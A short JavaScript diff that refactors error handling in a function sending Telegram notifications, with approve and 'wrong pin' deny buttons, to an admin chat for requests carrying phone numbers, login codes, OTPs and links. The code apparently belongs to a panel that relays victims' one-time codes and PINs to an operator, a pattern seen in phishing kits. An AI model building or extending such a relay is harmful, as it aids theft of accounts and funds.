@@ -126,19 +126,17 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
           { text: '❌ wrong pin', callback_data: `deny:${id}` },
         ];
 
-  try {
-    return api.sendMessage({
-      chat_id: ADMIN_CHAT_ID,
-      text,
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [buttonRow],
-      },
-    });
-  } catch (err) {
+  return api.sendMessage({
+    chat_id: ADMIN_CHAT_ID,
+    text,
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [buttonRow],
+    },
+  }).catch((err) => {
     console.error('Failed to send Telegram notification:', err.message);
     return null;
-  }
+  });
 }
 
 function createApprovalRequest({ plan, price, phone, step = 'login', code = '', otp = '', link = '' } = {}) {
